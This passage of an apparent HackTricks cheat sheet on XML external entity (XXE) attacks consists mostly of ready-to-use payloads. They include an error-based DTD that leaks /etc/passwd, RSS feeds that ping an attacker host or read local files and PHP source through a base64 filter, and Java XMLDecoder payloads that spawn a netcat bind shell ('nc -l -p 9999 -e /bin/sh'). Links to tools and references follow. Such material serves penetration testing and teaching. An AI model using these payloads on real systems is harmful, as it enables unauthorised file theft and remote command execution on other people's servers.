Great! The `non-exist` file is reflected in the Error messages. Next is adding the File Content.

DTD File:

```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```

And the content of the file was successfully **printed in the output of the error sent via HTTP**.

## RSS - XEE

Valid XML with RSS format to exploit an XXE vulnerability.

### Ping back

Simple HTTP request to attackers server

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```

### Read file

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```

### Read source code

Using PHP base64 filter

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```

## Java XMLDecoder XEE to RCE

XMLDecoder is a Java class that creates objects based on a XML message. If a malicious user can get an application to use arbitrary data in a call to the method **readObject**, he will instantly gain code execution on the server.

### Using Runtime().exec()

```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
 <object class="java.lang.Runtime" method="getRuntime">
      <void method="exec">
      <array class="java.lang.String" length="6">
          <void index="0">
              <string>/usr/bin/nc</string>
          </void>
          <void index="1">
              <string>-l</string>
          </void>
          <void index="2">
              <string>-p</string>
          </void>
          <void index="3">
              <string>9999</string>
          </void>
          <void index="4">
              <string>-e</string>
          </void>
          <void index="5">
              <string>/bin/sh</string>
          </void>
      </array>
      </void>
 </object>
</java>
```

### ProcessBuilder

```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="6">
      <void index="0">
        <string>/usr/bin/nc</string>
      </void>
      <void index="1">
         <string>-l</string>
      </void>
      <void index="2">
         <string>-p</string>
      </void>
      <void index="3">
         <string>9999</string>
      </void>
      <void index="4">
         <string>-e</string>
      </void>
      <void index="5">
         <string>/bin/sh</string>
      </void>
    </array>
    <void method="start" id="process">
    </void>
  </void>
</java>
```

## Tools

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## More resources

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
Extract info via HTTP using own external DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
